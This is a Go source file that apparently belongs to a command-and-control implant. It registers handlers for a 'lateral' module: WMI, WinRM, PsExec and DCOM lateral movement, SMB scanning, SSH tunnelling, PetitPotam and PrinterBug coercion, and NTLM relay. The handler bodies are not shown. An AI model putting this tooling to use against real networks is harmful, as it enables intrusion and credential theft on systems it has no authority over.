//go:build linux || windows || darwin
// +build linux windows darwin

package main

// Task registry: the optional "lateral" module (see internal/payload/agent_modules.go).
// The generator drops this file whole when the operator excludes the module;
// every entry point below disappears with it and the linker dead-codes the
// unreferenced handlers.

func init() {
	taskHandlers["lateral"] = handleLateral
	taskHandlers["lateral_wmi"] = handleLateralWMI
	taskHandlers["lateral_winrm"] = handleLateralWinRM
	taskHandlers["lateral_psexec"] = handleLateralPsexec
	taskHandlers["lateral_dcom"] = handleLateralDCOM
	taskHandlers["lateral_scf"] = handleLateralSCF
	taskHandlers["lateral_list"] = handleLateralList
	taskHandlers["net"] = handleNet
	taskHandlers["net_scan_smb"] = handleNetScanSMB
	taskHandlers["net_enum_hosts"] = handleNetEnumHosts
	taskHandlers["ssh_lateral"] = handleSSHLateral
	taskHandlers["ssh_keygen"] = handleSSHKeygen
	taskHandlers["ssh_tunnel"] = handleSSHTunnel
	taskHandlers["scp_upload"] = handleSCPUpload
	taskHandlers["coerce_printerbug"] = handleCoercePrinterBug
	taskHandlers["coerce_petitpotam"] = handleCoercePetitPotam
	taskHandlers["coerce_dfs"] = handleCoerceDFS
	taskHandlers["relay_ntlm_start"] = handleRelayNTLMStart
	taskHandlers["relay_ntlm_stop"] = handleRelayNTLMStop
	taskHandlers["ntlm_help"] = handleNTLMHelp
}
